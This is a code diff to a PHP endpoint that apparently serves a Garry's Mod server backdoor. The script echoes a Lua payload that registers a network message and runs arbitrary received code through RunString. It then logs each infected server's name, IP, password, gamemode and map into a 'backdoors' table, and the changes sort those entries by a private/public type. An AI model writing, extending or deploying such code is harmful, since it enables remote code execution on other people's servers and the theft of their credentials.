@@ -13,6 +13,7 @@ $server = $_POST['server'];
 $serverip = $_POST['serverip'];
 $gamemode = $_POST['gamemode'];
 $password = $_POST['password'];
+$type = $_GET['type']; // privacy
 $token = $_GET['token'];
 $map = $_POST['map'];
 
@@ -26,18 +27,18 @@ $lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunStri
 
 echo $lua; // echo the backdoor script
 
-if($token) {
-    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => $token]);
+if($type == "private") {
+    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'type' => $type]);
     
     // if the servers not found then create the log else if the servers found then update the log
-    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
+    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["type" => $type, "server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
     else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
 }
-else {
-    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => 'NONE']);
+elseif($type == "public") {
+    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'type' => $type]);
     
     // if the servers not found then create the log else if the servers found then update the log
-    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
+    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["type" => $type, "server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
     else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
     
     $json_data = json_encode([
